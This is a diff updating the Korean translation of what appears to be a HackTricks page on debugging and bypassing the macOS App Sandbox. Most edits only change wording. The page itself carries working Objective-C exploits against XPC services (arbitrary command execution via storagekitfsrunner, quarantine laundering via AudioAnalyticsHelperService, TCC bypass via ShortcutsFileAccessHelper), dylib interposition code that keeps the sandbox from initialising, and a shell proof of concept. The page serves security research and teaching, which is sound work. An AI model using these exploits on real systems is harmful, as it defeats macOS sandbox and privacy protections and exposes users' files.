@@ -1,4 +1,4 @@
-# macOS Sandbox Debug & Bypass
+# macOS Sandbox 디버깅 및 우회
 
 {{#include ../../../../../banners/hacktricks-training.md}}
 
@@ -8,34 +8,34 @@
 
 이전 이미지에서는 **`com.apple.security.app-sandbox`** entitlement가 있는 애플리케이션이 실행될 때 **Sandbox가 로드되는 방식**을 확인할 수 있습니다.
 
-컴파일러는 `/usr/lib/libSystem.B.dylib`를 바이너리에 링크합니다.
+컴파일러는 `/usr/lib/libSystem.B.dylib`를 바이너리에 link합니다.
 
-그런 다음 **`libSystem.B`**가 여러 함수를 차례로 호출하고, **`xpc_pipe_routine`**이 앱의 entitlement를 **`securityd`**로 전송합니다. Securityd는 프로세스를 Sandbox 내부에 quarantine해야 하는지 확인하며, 필요한 경우 quarantine합니다.\
-마지막으로 **`__sandbox_ms`**를 호출하고, 이 함수가 **`__mac_syscall`**을 호출하면서 Sandbox가 활성화됩니다.<sup>[[1]](#references)[[3]](#references)</sup>
+그런 다음 **`libSystem.B`**가 여러 함수를 호출하고, **`xpc_pipe_routine`**이 애플리케이션의 entitlements를 **`securityd`**로 전송합니다. Securityd는 프로세스를 Sandbox 내부에 격리해야 하는지 확인하고, 필요한 경우 격리합니다.\
+마지막으로 **`__sandbox_ms`**를 호출하여 Sandbox를 활성화하며, 이 함수는 **`__mac_syscall`**을 호출합니다.<sup>[[1]](#references)[[3]](#references)</sup>
 
-## 가능한 Bypasses
+## 가능한 우회 방법
 
 ### quarantine attribute 우회
 
-**Sandbox된 프로세스가 생성한 파일에는** Sandbox escape를 방지하기 위해 **quarantine attribute**가 추가됩니다. 새 애플리케이션을 생성한 뒤 실행하려고 하면 quarantine flag가 이를 차단합니다. 따라서 **quarantine attribute 없이 파일이나 폴더를 생성할 수 있다면 App Sandbox를 escape할 수 있습니다** — `.app` bundle을 생성하고 `open`으로 실행하면 됩니다. 새로 실행된 프로세스는 사용자의 Sandbox가 아니라 LaunchServices 아래에서 실행되기 때문입니다.
+**Sandbox된 프로세스가 생성한 파일**에는 Sandbox escape를 방지하기 위해 **quarantine attribute**가 추가됩니다. 새 애플리케이션을 생성하고 실행하려고 하면 quarantine flag가 실행을 차단합니다. 따라서 **quarantine attribute 없이 파일이나 폴더를 생성할 수 있다면 App Sandbox를 탈출할 수 있습니다** — `.app` bundle을 생성한 다음 `open`으로 실행하면 됩니다. 새로 실행된 프로세스는 사용자의 Sandbox가 아니라 LaunchServices에서 실행되기 때문입니다.
 
-**quarantine되지 않은 파일을 생성하는** 신뢰할 수 있는 방법은 **다른 프로세스에 파일 생성을 요청하는 것**입니다. Mickey Jin의 [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)에 설명되어 있듯이, **App Sandbox**는 생성된 파일에 quarantine을 표시하지만 **Service Sandbox에서 실행되는 XPC service는 그렇지 않습니다**. 따라서 인증되지 않은 여러 XPC service를 "quarantine laundering" primitive로 사용할 수 있습니다:<sup>[[4]](#references)</sup>
+**quarantine되지 않은 파일을 생성하는** 안정적인 방법은 **다른 프로세스에 파일 생성을 요청하는 것**입니다. Mickey Jin의 [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)에 설명된 것처럼, **App Sandbox**는 생성된 파일에 quarantine을 설정하지만 **Service Sandbox에서 실행되는 XPC services는 그렇지 않습니다**. 따라서 인증되지 않은 여러 XPC services를 "quarantine laundering" primitive로 사용할 수 있습니다:<sup>[[4]](#references)</sup>
 
-- **CVE-2023-27944** (`TrialArchivingService`) 및 **CVE-2023-32414** (`ArchiveService`): Sandbox된 앱이 전달한 archive를 선택한 위치에 압축 해제하며, **quarantine xattr를 추출된 콘텐츠에 전파하지 않습니다**.
-- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): `submitSignpostDataWithConfig:`의 path traversal을 통해 **quarantine 없이 임의의 directory를 생성**할 수 있어, container 외부에 전체 `.app` bundle 구조를 생성할 수 있습니다.
-- **CVE-2024-27864** (`diskimagescontroller.xpc`): quarantine된 DMG를 attach하지만 **결과 device에는 quarantine을 적용하지 않으므로**, mount된 volume의 앱을 실행할 수 있습니다.
+- **CVE-2023-27944** (`TrialArchivingService`) 및 **CVE-2023-32414** (`ArchiveService`): Sandbox된 앱이 전달한 archive를 선택한 위치에 추출하며, 추출된 콘텐츠에 **quarantine xattr를 전파하지 않습니다**.
+- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): `submitSignpostDataWithConfig:`의 path traversal을 통해 **quarantine 없이 임의의 디렉터리를 생성**할 수 있으며, 이를 이용하면 container 외부에 전체 `.app` bundle 구조를 만들 수 있습니다.
+- **CVE-2024-27864** (`diskimagescontroller.xpc`): quarantine된 DMG를 attach하지만 **그 결과 생성되는 device에는 quarantine을 설정하지 않으므로**, mount된 volume의 앱을 실행할 수 있습니다.
 
 > [!TIP]
-> 일반적으로 압축 해제 과정에서 **executable permission bit가 제거됩니다**. CVE-2023-27944에서 사용된 workaround는 bundle의 main executable로 기존의 서명된 system binary(예: `/System/Library/CoreServices/Automator Application Stub`)를 가리키는 **symlink**를 배치하는 것이었습니다. 이렇게 하면 생성된 파일에 `+x`가 없어도 실행할 수 있습니다.
+> 추출 과정에서는 일반적으로 **executable permission bit가 제거됩니다**. CVE-2023-27944에서 사용된 workaround는 bundle의 main executable로 기존에 서명된 시스템 바이너리(예: `/System/Library/CoreServices/Automator Application Stub`)를 가리키는 **symlink**를 배치하는 것이었습니다. 이렇게 하면 생성된 파일에 `+x`가 없어도 실행할 수 있습니다.
 
 > [!CAUTION]
-> 이 방식이 작동하는 이유는 검사가 실행되는 항목의 **flag에 의해 결정되기 때문**입니다. *"Finder 또는 GUI에서 앱이나 다른 executable code가 실행되면 macOS는 이를 로드하기 전에 quarantine flag를 확인하며"*, 그 이후에만 *"전체 'first run' security checks를 위해 Gatekeeper로 전달됩니다"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). 실행하는 bundle에 flag가 없으면 Gatekeeper 검사가 수행되지 않으며, 이것이 위 CVE들이 제공하는 정확한 primitive입니다.<sup>[[5]](#references)</sup>
+> 이것이 작동하는 이유는 검사가 실행되는 항목의 **flag에 의해 결정되기 때문**입니다: *"Finder 또는 GUI에서 앱이나 기타 executable code를 실행하면 macOS는 해당 항목을 로드하기 전에 quarantine flag를 확인합니다"*. 그런 다음에야 *"전체적인 'first run' security checks를 위해 Gatekeeper로 전달됩니다"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). 실행하는 bundle에 flag가 없으면 Gatekeeper 검사가 수행되지 않습니다 — 바로 이것이 위 CVE들이 제공하는 primitive입니다.<sup>[[5]](#references)</sup>
 >
-> `.app` bundle이 이미 실행 권한을 부여받은 경우(quarantine xattr에 "authorized to run" flag가 설정된 경우)에도 이를 abuse할 수 있습니다... 다만 이제 **`.app`** bundle 내부에 쓰려면 일부 privileged TCC perms가 필요하며, Sandbox 내부에서는 이를 보유하지 못합니다.
+> `.app` bundle이 이미 실행 허가를 받은 경우(즉, "authorized to run" flag가 설정된 quarantine xattr가 있는 경우)에도 이를 abuse할 수 있습니다... 다만 이제는 일부 privileged TCC perms가 없으면 **`.app`** bundles 내부에 쓸 수 없습니다. Sandbox 내부에서는 이러한 권한을 갖지 못합니다.
 
-### Open functionality abuse
+### Open 기능 abuse
 
-[**Word Sandbox bypass의 마지막 예시**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)에서는 **`open`** cli functionality를 abuse하여 Sandbox를 bypass하는 방법을 확인할 수 있습니다.
+[**Word Sandbox bypass의 마지막 예시**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)에서는 **`open`** cli functionality를 abuse하여 Sandbox를 우회하는 방법을 확인할 수 있습니다.
 
 
 {{#ref}}
@@ -44,16 +44,16 @@ macos-office-sandbox-bypasses.md
 
 ### Launch Agents/Daemons
 
-애플리케이션이 **Sandbox되도록 설계되어 있더라도**(`com.apple.security.app-sandbox`), 예를 들어 **LaunchAgent**(`~/Library/LaunchAgents`)에서 **실행되면** Sandbox를 bypass할 수 있습니다.\
-[**이 post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)에서 설명하듯이, Sandbox된 애플리케이션으로 persistence를 확보하려면 이를 LaunchAgent로 자동 실행되도록 만들고 DyLib environment variable을 통해 malicious code를 inject할 수 있습니다.<sup>[[6]](#references)</sup>
+애플리케이션이 **Sandbox되도록 설계되어 있더라도**(`com.apple.security.app-sandbox`), 예를 들어 **LaunchAgent**(`~/Library/LaunchAgents`)에서 실행되도록 하면 Sandbox를 우회할 수 있습니다.\
+[**이 게시물**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)에서 설명하듯이, Sandbox된 애플리케이션으로 persistence를 확보하려면 해당 애플리케이션이 LaunchAgent로 자동 실행되도록 만들고 DyLib environment variables를 통해 malicious code를 inject할 수 있습니다.<sup>[[6]](#references)</sup>
 
 ### Auto Start Locations abuse
 
-Sandbox된 프로세스가 **나중에 Sandbox되지 않은 애플리케이션이 바이너리를 실행할 위치에** **write**할 수 있다면, 해당 위치에 바이너리를 **배치하는 것만으로 escape**할 수 있습니다. 이러한 위치의 좋은 예로 `~/Library/LaunchAgents` 또는 `/System/Library/LaunchDaemons`가 있습니다.
+Sandbox된 프로세스가 **나중에 Sandbox되지 않은 애플리케이션이 바이너리를 실행할 위치에 쓸 수 있다면**, 해당 위치에 바이너리를 **배치하는 것만으로 escape**할 수 있습니다. 이러한 위치의 좋은 예로 `~/Library/LaunchAgents` 또는 `/System/Library/LaunchDaemons`가 있습니다.
 
-이를 위해서는 **2단계**가 필요할 수도 있습니다. 즉, **더 permissive한 Sandbox**(`file-read*`, `file-write*`)를 가진 프로세스가 실제로 코드를 실행하도록 만들어, 해당 코드가 **Sandbox되지 않은 상태로 실행될 위치에** write하도록 해야 합니다.
+이 작업에는 **2단계**가 필요할 수도 있습니다. **더 permissive한 Sandbox**(`file-read*`, `file-write*`)를 사용하는 프로세스가 실제로는 바이너리를 **Sandbox되지 않은 상태로 실행될 위치에 쓰는** 코드를 실행하도록 만드는 것입니다.
 
-**Auto Start locations**에 대한 다음 페이지를 확인하세요:
+**Auto Start locations**에 대한 이 페이지를 확인하십시오:
 
 
 {{#ref}}
@@ -62,7 +62,7 @@ Sandbox된 프로세스가 **나중에 Sandbox되지 않은 애플리케이션�
 
 ### 다른 프로세스 abuse
 
-Sandbox된 프로세스에서 더 제한적인 Sandbox가 적용되지 않은(또는 Sandbox가 없는) 다른 프로세스를 **compromise**할 수 있다면, 해당 프로세스의 Sandbox로 escape할 수 있습니다:
+Sandbox된 프로세스에서 더 제한이 적은 Sandbox(또는 Sandbox가 없는 환경)에서 실행 중인 **다른 프로세스를 compromise**할 수 있다면, 해당 프로세스의 Sandbox로 escape할 수 있습니다:
 
 
 {{#ref}}
@@ -71,11 +71,11 @@ Sandbox된 프로세스에서 더 제한적인 Sandbox가 적용되지 않은(�
 
 ### 사용 가능한 System 및 User Mach services
 
-Sandbox는 profile `application.sb`에 정의된 XPC를 통해 특정 **Mach services**와 통신할 수도 있습니다. 이러한 service 중 하나를 **abuse**할 수 있다면 **Sandbox를 escape**할 수 있습니다.
+Sandbox는 profile `application.sb`에 정의된 XPC를 통해 특정 **Mach services**와 통신할 수 있도록 허용합니다. 이러한 services 중 하나를 **abuse**할 수 있다면 **Sandbox를 escape**할 수 있습니다.
 
-[이 writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)에 설명되어 있듯이 Mach service 정보는 `/System/Library/xpc/launchd.plist`에 저장됩니다. 해당 파일에서 `<string>System</string>` 및 `<string>User</string>`를 검색하면 모든 System 및 User Mach service를 찾을 수 있습니다.<sup>[[4]](#references)</sup>
+[이 writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)에 설명된 것처럼 Mach services에 대한 정보는 `/System/Library/xpc/launchd.plist`에 저장됩니다. 해당 파일에서 `<string>System</string>` 및 `<string>User</string>`를 검색하면 모든 System 및 User Mach services를 찾을 수 있습니다.<sup>[[4]](#references)</sup>
 
-또한 `bootstrap_look_up`을 호출하여 Mach service가 Sandbox된 애플리케이션에서 사용 가능한지 확인할 수 있습니다:
+또한 `bootstrap_look_up`을 호출하여 Sandbox된 애플리케이션에서 Mach service를 사용할 수 있는지 확인할 수 있습니다:
 ```objectivec
 void checkService(const char *serviceName) {
 mach_port_t service_port = MACH_PORT_NULL;
@@ -98,28 +98,28 @@ checkService(serviceName.UTF8String);
 }
 }
 ```
-### Available PID Mach services
+### 사용 가능한 PID Mach services
 
-이러한 Mach services는 [이 writeup에서 sandbox를 탈출하기 위해](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) 처음 악용되었습니다. 당시에는 애플리케이션과 해당 framework에 필요한 **모든 XPC services**가 애플리케이션의 PID domain에 표시되었습니다(`ServiceType`이 `Application`인 Mach Services).<sup>[[4]](#references)</sup>
+이러한 Mach services는 [이 writeup에서 sandbox를 탈출하기 위해 처음 악용되었습니다](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). 당시에는 애플리케이션과 해당 framework에 필요한 **모든 XPC services**가 애플리케이션의 PID domain에서 표시되었습니다(`ServiceType`이 `Application`인 Mach Services).<sup>[[4]](#references)</sup>
 
-**PID Domain XPC service에 contact**하려면 다음과 같은 한 줄을 사용해 애플리케이션 내부에 이를 register하기만 하면 됩니다:
+**PID Domain XPC service에 연결**하려면 다음과 같은 한 줄을 사용하여 애플리케이션 내부에 등록하기만 하면 됩니다:
 ```objectivec
 [[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
 ```
-또한 `System/Library/xpc/launchd.plist`에서 `<string>Application</string>`을 검색하면 모든 **Application** Mach services를 찾을 수 있습니다.
+또한 `System/Library/xpc/launchd.plist`에서 `<string>Application</string>`을 검색하면 모든 **Application** Mach 서비스를 찾을 수 있습니다.
 
-유효한 XPC services를 찾는 또 다른 방법은 다음 위치의 항목을 확인하는 것입니다:
+유효한 xpc 서비스를 찾는 또 다른 방법은 다음 위치에 있는 서비스를 확인하는 것입니다:
 ```bash
 find /System/Library/Frameworks -name "*.xpc"
 find /System/Library/PrivateFrameworks -name "*.xpc"
 ```
-이 technique를 악용한 여러 예시는 [**original writeup**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)에서 확인할 수 있으며, 다음은 일부 요약된 예시입니다.<sup>[[4]](#references)</sup>
+이 technique을 악용하는 여러 예시는 [**original writeup**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)에서 확인할 수 있으며, 다음은 일부 요약된 예시입니다.<sup>[[4]](#references)</sup>
 
 #### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
 
 이 service는 항상 `YES`를 반환하여 모든 XPC connection을 허용하며, `runTask:arguments:withReply:` method는 임의의 params를 사용해 임의의 command를 실행합니다.
 
-exploit은 "다음과 같이 간단했습니다":
+해당 exploit은 "다음처럼 간단했습니다":
 ```objectivec
 @protocol SKRemoteTaskRunnerProtocol
 -(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@@ -140,11 +140,11 @@ NSLog(@"run task result:%@, error:%@", bSucc, error);
 ```
 #### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
 
-이 XPC service는 항상 `YES`를 반환하여 모든 client를 허용했으며, `createZipAtPath:hourThreshold:withReply:` method는 폴더 경로를 받아 ZIP file로 압축했습니다.
+이 XPC service는 항상 `YES`를 반환하여 모든 client를 허용했으며, `createZipAtPath:hourThreshold:withReply:` method는 폴더의 path를 받아 ZIP file로 압축했습니다.
 
-따라서 가짜 app folder structure를 생성하고 이를 압축한 다음, 압축을 해제하여 실행함으로써 sandbox를 탈출할 수 있었습니다. 새 파일에는 quarantine attribute가 설정되지 않기 때문입니다.
+따라서 가짜 app folder structure를 생성하고 압축한 다음, 압축을 해제하여 실행함으로써 sandbox를 탈출할 수 있습니다. 새 file에는 quarantine attribute가 적용되지 않기 때문입니다.
 
-exploit은 다음과 같습니다:
+exploit은 다음과 같았습니다:
 ```objectivec
 @protocol AudioAnalyticsHelperServiceProtocol
 -(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@@ -183,7 +183,7 @@ break;
 ```
 #### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc
 
-이 XPC service는 어떤 연결이든 허용하는 `extendAccessToURL:completion:` 메서드를 통해 XPC client에 임의의 URL에 대한 읽기 및 쓰기 access를 부여할 수 있습니다. XPC service가 FDA를 보유하고 있으므로, 이러한 permissions를 악용해 TCC를 완전히 우회할 수 있습니다.
+이 XPC service는 어떤 연결이든 허용하는 `extendAccessToURL:completion:` 메서드를 통해 XPC client에 임의의 URL에 대한 읽기 및 쓰기 access를 부여할 수 있습니다. XPC service에 FDA가 있으므로 이러한 권한을 악용하여 TCC를 완전히 우회할 수 있습니다.
 
 exploit은 다음과 같습니다:
 ```objectivec
@@ -213,40 +213,40 @@ NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
 }];
 }
 ```
-### Static Compiling 및 Dynamically linking
+### 정적 컴파일 및 동적 linking
 
-[**이 research**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)에서는 Sandbox를 우회하는 2가지 방법을 발견했습니다. Sandbox는 **libSystem** library가 로드될 때 userland에서 적용되기 때문입니다. 바이너리가 해당 library의 로드를 피할 수 있다면 Sandbox가 적용되지 않습니다:<sup>[[2]](#references)</sup>
+[**이 연구**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)에서는 Sandbox를 우회하는 2가지 방법을 발견했습니다. Sandbox는 **libSystem** library가 로드될 때 userland에서 적용되기 때문입니다. binary가 해당 library의 로드를 피할 수 있다면 Sandbox가 적용되지 않습니다:<sup>[[2]](#references)</sup>
 
-- 바이너리가 **완전히 statically compiled**되었다면 해당 library의 로드를 피할 수 있습니다.
-- **바이너리가 어떤 library도 로드할 필요가 없다면**(linker도 libSystem에 있기 때문) libSystem을 로드할 필요가 없습니다.
+- binary가 **완전히 정적으로 컴파일**되었다면 해당 library의 로드를 피할 수 있습니다.
+- **binary가 어떤 library도 로드할 필요가 없다면** (linker도 libSystem에 있기 때문에), libSystem을 로드할 필요가 없습니다.
 
 ### Shellcodes
 
-**shellcodes**조차도 ARM64에서는 `libSystem.dylib`에 link되어야 한다는 점에 유의하세요:
+ARM64의 **shellcodes**조차 `libSystem.dylib`에 link되어야 한다는 점에 유의하세요:
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
-### 상속되지 않는 restrictions
+### 상속되지 않는 제한
 
-**[이 writeup의 보너스 내용](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**에서 설명한 것처럼, 다음과 같은 sandbox restriction은:<sup>[[4]](#references)</sup>
+**[이 writeup의 bonus](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**에서 설명한 것처럼, 다음과 같은 sandbox restriction은:<sup>[[4]](#references)</sup>
 ```
 (version 1)
 (allow default)
 (deny file-write* (literal "/private/tmp/sbx"))
 ```
-예를 들어 새 프로세스가 다음을 실행하면 우회할 수 있습니다:
+예를 들어 다음을 실행하는 새 프로세스로 우회할 수 있습니다:
 ```bash
 mkdir -p /tmp/poc.app/Contents/MacOS
 echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
 chmod +x /tmp/poc.app/Contents/MacOS/poc
 open /tmp/poc.app
 ```
-그러나 물론, 이 새로운 프로세스는 부모 프로세스의 entitlements 또는 privileges를 상속하지 않습니다.
+하지만 물론, 이 새 process는 parent process의 entitlements 또는 privileges를 상속하지 않습니다.
 
 ### Entitlements
 
-애플리케이션에 특정 **entitlement**가 있으면 일부 **actions**가 **sandbox에서 허용**될 수 있다는 점에 유의하세요. 예를 들면 다음과 같습니다:
+애플리케이션에 다음과 같은 특정 **entitlement**이 있으면 일부 **actions**가 **sandbox에서 허용될 수 있음**에 유의하세요.
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -265,7 +265,7 @@ open /tmp/poc.app
 ../../../macos-proces-abuse/macos-function-hooking.md
 {{#endref}}
 
-#### sandbox를 방지하기 위해 `_libsecinit_initializer`를 Interpost
+#### Interpost `_libsecinit_initializer`하여 sandbox 방지
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -289,7 +289,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
-#### Sandbox를 방지하기 위한 `__mac_syscall` Interpose
+#### Sandbox를 방지하기 위해 `__mac_syscall` Interpose
 ```c:interpose.c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -372,7 +372,7 @@ system("cat ~/Desktop/del.txt");
 {{#endtab}}
 {{#endtabs}}
 
-그런 다음 앱을 compile하세요:
+그런 다음 앱을 컴파일합니다:
 ```bash
 # Compile it
 gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand
@@ -383,8 +383,8 @@ gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.pli
 codesign -s <cert-name> --entitlements entitlements.xml sand
 ```
 > [!CAUTION]
-> 앱은 **`~/Desktop/del.txt`** 파일을 **읽으려고** 시도하지만, **Sandbox에서는 허용되지 않습니다**.\
-> Sandbox가 우회되면 해당 파일을 읽을 수 있으므로 그 위치에 파일을 생성합니다:
+> 앱은 **`~/Desktop/del.txt`** 파일을 **읽으려고** 시도하지만, **Sandbox는 이를 허용하지 않습니다**.\
+> Sandbox가 우회되면 해당 파일을 읽을 수 있으므로 그 위치에 파일을 생성하세요:
 >
 > ```bash
 > echo "Sandbox Bypassed" > ~/Desktop/del.txt
@@ -467,14 +467,14 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
-> [!WARNING] > **Sandbox를 우회했더라도 TCC**는 프로세스가 데스크톱의 파일을 읽도록 허용할지 사용자에게 묻습니다
+> [!WARNING] > **Sandbox를 우회해도 TCC**는 프로세스가 데스크톱의 파일을 읽도록 허용할지 사용자에게 묻습니다
 
 ## References
 
-- [1] [Jonathan Levin - Apple Sandbox: 수렁 속으로 더 깊이 (HITB GSEC 2016 슬라이드)](http://newosxbook.com/files/HITSB.pdf)
-- [2] [Saagar Jha - Mac App Store Sandbox 탈출](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
+- [1] [Jonathan Levin - Apple Sandbox: 수렁 속으로 더 깊이 (HITB GSEC 2016 slides)](http://newosxbook.com/files/HITSB.pdf)
+- [2] [Saagar Jha - Mac App Store Sandbox Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
 - [3] [Jonathan Levin - Apple Sandbox: 수렁 속으로 더 깊이 (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
-- [4] [Mickey Jin - macOS Sandbox Escapes의 새로운 시대](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
-- [5] [The Eclectic Light Company - 해설: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
-- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): DyLib Injection을 사용하는 Telegram을 통한 macOS TCC Bypass (파트 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
+- [4] [Mickey Jin - macOS Sandbox Escape의 새로운 시대](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
+- [5] [The Eclectic Light Company - 설명: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
+- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): DyLib Injection을 사용한 Telegram 기반 macOS TCC Bypass (Part 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
 {{#include ../../../../../banners/hacktricks-training.md}}
